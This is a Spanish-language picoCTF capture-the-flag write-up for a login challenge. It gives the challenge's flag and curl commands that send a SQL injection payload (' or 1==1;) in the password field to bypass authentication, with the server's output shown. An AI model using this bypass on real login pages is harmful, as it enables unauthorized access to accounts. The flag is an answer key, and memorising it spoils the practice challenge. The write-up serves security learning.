## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Pistas
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.
## Solucion
```
Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
## Otra solucion
```
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>                                                                                                              
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1==1;&debug=1"
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>
```
## Notas adicionales 
es una vulnerabilidad de SQL entonces buscamos ayuda en la pagina y vimos que con poner el siguiente comando en el password **' or 1= =1;** (todo junto lo de =) accedemos de cualquier nombre de usuario y entramos

la peticion **POST** se representa como -d
para ser silencioso es -s 
el codigo asi quedaria en la terminal **curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1= =1;&debug=1"** (tambien junto los iguales lo pongo asi por que se mira feo el editor)
y tambien ponemos en el url **.php** por que ahi es donde se dirigue la pagina cuando ponemos el password
## Referencias 
https://www.w3schools.com/sql/sql_injection.asp
